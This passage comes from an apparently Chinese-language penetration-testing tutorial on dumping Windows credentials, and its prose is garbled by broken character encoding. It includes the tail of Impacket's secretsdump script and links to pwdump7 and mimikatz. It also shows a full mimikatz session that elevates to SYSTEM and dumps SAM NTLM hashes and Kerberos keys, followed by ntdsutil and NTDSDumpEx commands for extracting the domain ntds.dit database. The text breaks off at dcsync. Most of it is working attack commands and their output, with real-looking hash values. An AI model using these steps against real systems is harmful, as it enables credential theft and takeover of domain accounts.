<span class="string">&#x27;mmcexec&#x27;</span>], nargs=<span class="string">&#x27;?&#x27;</span>, default=<span class="string">&#x27;smbexec&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Remote exec &#x27;</span></span><br><span class="line">                        <span class="string">&#x27;method to use at target (only when using -use-vss). Default: smbexec&#x27;</span>)</span><br><span class="line">    group = parser.add_argument_group(<span class="string">&#x27;display options&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-just-dc-user&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, metavar=<span class="string">&#x27;USERNAME&#x27;</span>,</span><br><span class="line">                       <span class="built_in">help</span>=<span class="string">&#x27;Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach. &#x27;</span></span><br><span class="line">                            <span class="string">&#x27;Implies also -just-dc switch&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-just-dc&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, default=<span class="literal">False</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;Extract only NTDS.DIT data (NTLM hashes and Kerberos keys)&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-just-dc-ntlm&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, default=<span class="literal">False</span>,</span><br><span class="line">                       <span class="built_in">help</span>=<span class="string">&#x27;Extract only NTDS.DIT data (NTLM hashes only)&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-pwd-last-set&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, default=<span class="literal">False</span>,</span><br><span class="line">                       <span class="built_in">help</span>=<span class="string">&#x27;Shows pwdLastSet attribute for each NTDS.DIT account. Doesn\&#x27;t apply to -outputfile data&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-user-status&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, default=<span class="literal">False</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;Display whether or not the user is disabled&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-history&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Dump password history, and LSA secrets OldVal&#x27;</span>)</span><br><span class="line">    group = parser.add_argument_group(<span class="string">&#x27;authentication&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    group.add_argument(<span class="string">&#x27;-hashes&#x27;</span>, action=<span class="string">&quot;store&quot;</span>, metavar = <span class="string">&quot;LMHASH:NTHASH&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;NTLM hashes, format is LMHASH:NTHASH&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-no-pass&#x27;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;don\&#x27;t ask for password (useful for -k)&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-k&#x27;</span>, action=<span class="string">&quot;store_true&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Use Kerberos authentication. Grabs credentials from ccache file &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use&#x27;</span></span><br><span class="line">                             <span class="string">&#x27; the ones specified in the command line&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-aesKey&#x27;</span>, action=<span class="string">&quot;store&quot;</span>, metavar = <span class="string">&quot;hex key&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;AES key to use for Kerberos Authentication&#x27;</span></span><br><span class="line">                                                                            <span class="string">&#x27; (128 or 256 bits)&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-keytab&#x27;</span>, action=<span class="string">&quot;store&quot;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Read keys for SPN from keytab file&#x27;</span>)</span><br><span class="line">    group = parser.add_argument_group(<span class="string">&#x27;connection&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-dc-ip&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>,metavar = <span class="string">&quot;ip address&quot;</span>,  <span class="built_in">help</span>=<span class="string">&#x27;IP Address of the domain controller. If &#x27;</span></span><br><span class="line">                                 <span class="string">&#x27;ommited it use the domain part (FQDN) specified in the target parameter&#x27;</span>)</span><br><span class="line">    group.add_argument(<span class="string">&#x27;-target-ip&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, metavar=<span class="string">&quot;ip address&quot;</span>,</span><br><span class="line">                       <span class="built_in">help</span>=<span class="string">&#x27;IP Address of the target machine. If omitted it will use whatever was specified as target. &#x27;</span></span><br><span class="line">                            <span class="string">&#x27;This is useful when target is the NetBIOS name and you cannot resolve it&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)==<span class="number">1</span>:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    options = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Init the example&#x27;s logger theme</span></span><br><span class="line">    logger.init(options.ts)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> options.debug <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">        logging.getLogger().setLevel(logging.DEBUG)</span><br><span class="line">        <span class="comment"># Print the Library&#x27;s installation path</span></span><br><span class="line">        logging.debug(version.getInstallationPath())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        logging.getLogger().setLevel(logging.INFO)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">    domain, username, password, remoteName = re.<span class="built_in">compile</span>(<span class="string">&#x27;(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)&#x27;</span>).match(</span><br><span class="line">        options.target).groups(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#In case the password contains &#x27;@&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;@&#x27;</span> <span class="keyword">in</span> remoteName:</span><br><span class="line">        password = password + <span class="string">&#x27;@&#x27;</span> + remoteName.rpartition(<span class="string">&#x27;@&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        remoteName = remoteName.rpartition(<span class="string">&#x27;@&#x27;</span>)[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> options.just_dc_user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> options.use_vss <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;-just-dc-user switch is not supported in VSS mode&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> options.resumefile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;resuming a previous NTDS.DIT dump session not compatible with -just-dc-user switch&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> remoteName.upper() == <span class="string">&#x27;LOCAL&#x27;</span> <span class="keyword">and</span> username == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;-just-dc-user not compatible in LOCAL mode&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># Having this switch on implies not asking for anything else.</span></span><br><span class="line">            options.just_dc = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> options.use_vss <span class="keyword">is</span> <span class="literal">True</span> <span class="keyword">and</span> options.resumefile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        logging.error(<span class="string">&#x27;resuming a previous NTDS.DIT dump session is not supported in VSS mode&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> remoteName.upper() == <span class="string">&#x27;LOCAL&#x27;</span> <span class="keyword">and</span> username == <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> options.resumefile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        logging.error(<span class="string">&#x27;resuming a previous NTDS.DIT dump session is not supported in LOCAL mode&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> remoteName.upper() == <span class="string">&#x27;LOCAL&#x27;</span> <span class="keyword">and</span> username == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> options.system <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> options.bootkey <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;Either the SYSTEM hive or bootkey is required for local parsing, check help&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> options.target_ip <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            options.target_ip = remoteName</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> domain <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            domain = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> options.keytab <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)</span><br><span class="line">            options.k = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> password == <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> username != <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> options.hashes <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">and</span> options.no_pass <span class="keyword">is</span> <span class="literal">False</span> <span class="keyword">and</span> options.aesKey <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"></span><br><span class="line">            password = getpass(<span class="string">&quot;Password:&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> options.aesKey <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            options.k = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    dumper = DumpSecrets(remoteName, username, password, domain, options)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        dumper.dump()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">if</span> logging.getLogger().level == logging.DEBUG:</span><br><span class="line">            <span class="keyword">import</span> traceback</span><br><span class="line">            traceback.print_exc()</span><br><span class="line">        logging.error(e)</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/57.png" alt="image-20200803152140006"></p><p>è¿˜å¯ä»¥ç”¨<strong>pwdump7.exe</strong>ç›´æ¥è·å–ï¼Œä¸‹è½½åœ°å€å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.tarasco.org&#x2F;security&#x2F;pwdump_7&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/58.png" alt="image-20200803153049297"></p><p>è¿˜æœ‰<strong>mimikatz</strong>ä¹Ÿå¯ä»¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;gentilkiwi&#x2F;mimikatz</span><br></pre></td></tr></table></figure><p>è¿è¡Œåå¦‚ä¸‹</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\ascotbe&gt; .\mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x86) #19041 Jul 15 2020 16:10:22</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># token::elevate</span></span><br><span class="line">Token Id  : <span class="number">0</span></span><br><span class="line">User name :</span><br><span class="line">SID name  : NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line"><span class="number">868</span>     &#123;<span class="number">0</span>;<span class="number">000003</span>e7&#125; <span class="number">1</span> D <span class="number">87942</span>          NT AUTHORITY\SYSTEM     S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-18</span>        (<span class="number">04</span>g,<span class="number">21</span>p)       Primary</span><br><span class="line"> -&gt; Impersonated !</span><br><span class="line"> * <span class="keyword">Process</span> Token : &#123;<span class="number">0</span>;<span class="number">04</span>c06ab9&#125; <span class="number">2</span> F <span class="number">589748425</span>   DESKTOP<span class="literal">-S5P5JJD</span>\ascotbe S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-3954380970</span><span class="literal">-1750975696</span><span class="literal">-2860310519</span><span class="literal">-1001</span> (<span class="number">17</span>g,<span class="number">24</span>p)        Primary</span><br><span class="line"> * Thread Token  : &#123;<span class="number">0</span>;<span class="number">000003</span>e7&#125; <span class="number">1</span> D <span class="number">590261325</span>   NT AUTHORITY\SYSTEM     S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-18</span>        (<span class="number">04</span>g,<span class="number">21</span>p)       Impersonation (Delegation)</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># lsadump::sam</span></span><br><span class="line">Domain : DESKTOP<span class="literal">-S5P5JJD</span></span><br><span class="line">SysKey : <span class="number">162</span>ff22be845ceffcb86ad9fc6f5b8fa</span><br><span class="line">Local SID : S<span class="literal">-1</span><span class="literal">-5</span><span class="literal">-21</span><span class="literal">-3954380970</span><span class="literal">-1750975696</span><span class="literal">-2860310519</span></span><br><span class="line"></span><br><span class="line">SAMKey : c0776d417550ffc4c869dd75f05c783c</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f4 (<span class="number">500</span>)</span><br><span class="line">User : Administrator</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f5 (<span class="number">501</span>)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f7 (<span class="number">503</span>)</span><br><span class="line">User : DefaultAccount</span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000001</span>f8 (<span class="number">504</span>)</span><br><span class="line">User : WDAGUtilityAccount</span><br><span class="line">  Hash NTLM: ea5440b2fca105cdf6759f22e7c287d6</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">41</span>ccbf610919ce0103bd5f9f03349bf6</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer</span><span class="literal">-Keys</span> *</span><br><span class="line">    Default Salt : WDAGUtilityAccount</span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">01</span>c68f20c20b145a433f03a4b8922e9da06a8452f94d18a51e839b2d72d7c8e7</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">9</span>b87d173421e72aec02ba1e0e1b043c8</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : f229fdcb8cc20e2c</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : WDAGUtilityAccount</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : f229fdcb8cc20e2c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000003</span>e9 (<span class="number">1001</span>)</span><br><span class="line">User : ascotbe</span><br><span class="line">  Hash NTLM: <span class="number">3</span>dbde697d71690a769204beb12283678</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">1</span>f3b3c572b6a2f91204b073d6f148738</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer</span><span class="literal">-Keys</span> *</span><br><span class="line">    Default Salt : DESKTOP<span class="literal">-S5P5JJDascotbe</span></span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : e81117c0e58f31c5fc22e4ba480bb933c3b736986fc6975f714c79e22f8e7e1f</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">9</span>a4b1385fb0c7f0b763435c285d47037</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">8985</span>a74fd6c8e5c4</span><br><span class="line">    OldCredentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : e81117c0e58f31c5fc22e4ba480bb933c3b736986fc6975f714c79e22f8e7e1f</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">9</span>a4b1385fb0c7f0b763435c285d47037</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">8985</span>a74fd6c8e5c4</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : DESKTOP<span class="literal">-S5P5JJDascotbe</span></span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : <span class="number">8985</span>a74fd6c8e5c4</span><br><span class="line">    OldCredentials</span><br><span class="line">      des_cbc_md5       : <span class="number">8985</span>a74fd6c8e5c4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000003</span>ea (<span class="number">1002</span>)</span><br><span class="line">User : asc0t6e</span><br><span class="line">  Hash NTLM: <span class="number">32</span>ed87bdb5fdc5e9cba88547376818d4</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span> *</span><br><span class="line">    Random Value : <span class="number">5791</span>ed4fcb24d37bb6d45e422d0564b6</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer</span><span class="literal">-Keys</span> *</span><br><span class="line">    Default Salt : DESKTOP<span class="literal">-S5P5JJDasc0t6e</span></span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : fca1c2a6324d2824dfb41aa111c7225eb054028a1943c4a2f88b33e5c1d6d724</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : <span class="number">707804346421</span>c4c8834250d85b3a0d80</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">89763</span>b4ae3b3f829</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : DESKTOP<span class="literal">-S5P5JJDasc0t6e</span></span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : <span class="number">89763</span>b4ae3b3f829</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : <span class="number">000003</span>eb (<span class="number">1003</span>)</span><br><span class="line">User : www2</span><br><span class="line">  Hash NTLM: <span class="number">32</span>ed87bdb5fdc5e9cba88547376818d4</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span> *</span><br><span class="line">    Random Value : acc5ca5339811d2f4cf44f8427ff9333</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos<span class="literal">-Newer</span><span class="literal">-Keys</span> *</span><br><span class="line">    Default Salt : DESKTOP<span class="literal">-S5P5JJDwww2</span></span><br><span class="line">    Default Iterations : <span class="number">4096</span></span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (<span class="number">4096</span>) : <span class="number">37425</span>bb81e1ceb50cff95dfb985c60aeb3a44941b1c186cf6a2ecb66cb87a49d</span><br><span class="line">      aes128_hmac       (<span class="number">4096</span>) : b6ae15c330aa7db1b0f4b53575516c1e</span><br><span class="line">      des_cbc_md5       (<span class="number">4096</span>) : <span class="number">622</span>f8686a8fecbc8</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM<span class="literal">-Strong</span><span class="literal">-NTOWF</span></span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : DESKTOP<span class="literal">-S5P5JJDwww2</span></span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : <span class="number">622</span>f8686a8fecbc8</span><br></pre></td></tr></table></figure><h3 id="åŸŸHash"><a href="#åŸŸHash" class="headerlink" title="åŸŸHash"></a>åŸŸHash</h3><h4 id="NTDSUTIL"><a href="#NTDSUTIL" class="headerlink" title="NTDSUTIL"></a>NTDSUTIL</h4><p>è¯¥NTDSUTILæ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå®ƒæ˜¯åŸŸæ§åˆ¶å™¨ç”Ÿæ€ç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ï¼Œå…¶ç›®çš„æ˜¯ä¸ºäº†ä½¿ç®¡ç†å‘˜èƒ½å¤Ÿè®¿é—®å’Œç®¡ç†<code>Windows Active Directory</code>æ•°æ®åº“ã€‚ä½†æ˜¯ï¼Œæ¸—é€æµ‹è¯•äººå‘˜å’Œredteamå¯ä»¥ç”¨å®ƒæ¥æ‹æ‘„ç°æœ‰ntds.ditæ–‡ä»¶çš„å¿«ç…§ï¼Œè¯¥æ–‡ä»¶å¯ä»¥å¤åˆ¶åˆ°æ–°ä½ç½®ä»¥è¿›è¡Œç¦»çº¿åˆ†æå’Œå¯†ç å“ˆå¸Œçš„æå–ã€‚</p><blockquote><p>PSï¼šåªæœ‰åœ¨åŸŸæœåŠ¡å™¨ä¸Šæ‰æœ‰è¿™ä¸ªç¨‹åº</p></blockquote><p>æ‰§è¡Œè¿™ä¸ªå‘½ä»¤å°±å¯ä»¥æ‹æ‘„å¿«ç…§äº†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil</span><br><span class="line">activate instance ntds</span><br><span class="line">ifm</span><br><span class="line">create full C:\ntdsutil</span><br><span class="line">quit</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/59.png" alt="image-20200803213243474"></p><p>ç„¶ååœ¨<code>C:\ntdsutil</code>ä½ç½®å°±èƒ½çœ‹åˆ°æ‹æ‘„çš„å¿«ç…§äº†</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/60.png" alt="image-20200803213325057"></p><p>ç„¶åå¯ä»¥ä½¿ç”¨<strong>NTDSDumpEx</strong>è¿›è¡Œè§£å¯†ï¼Œé¡¹ç›®åœ°å€å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zcgonvh&#x2F;NTDSDumpEx</span><br></pre></td></tr></table></figure><p>å¦‚æœä½ åªæ˜¯ä½¿ç”¨ç®¡ç†å‘˜æƒé™è¿è¡Œçš„è¯å¯ä»¥æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤æ¥è·å–hashï¼Œ<code>-d</code>è¡¨ç¤ºè¯¥æ–‡ä»¶çš„è·¯å¾„ï¼Œ<code>-k</code>è¡¨ç¤ºè·å–çš„SYSTEMçš„key</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntdsdumpex.exe -r</span><br><span class="line">ntdsdumpex.exe -d ntds.dit -o hash.txt -k HEX-SYS-KEY</span><br></pre></td></tr></table></figure><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/IntranetPenetration/61.png" alt="image-20200803214714406"></p><h4 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h4><p>Mimikatzæœ‰ä¸€ä¸ªåŠŸèƒ½ï¼ˆdcsyncï¼‰ï¼Œå®ƒåˆ©ç”¨ç›®å½•å¤åˆ¶æœåŠ¡ï¼ˆDRSï¼‰ä»NTDS.DITæ–‡ä»¶ä¸­æ£€ç´¢å¯†ç å“ˆå¸Œå€¼ã€‚è¿™æ ·å­è§£å†³äº†éœ€è¦ç›´æ¥ä½¿ç”¨åŸŸæ§åˆ¶å™¨è¿›è¡Œèº«ä»½éªŒè¯çš„éœ€è¦ï¼Œå› 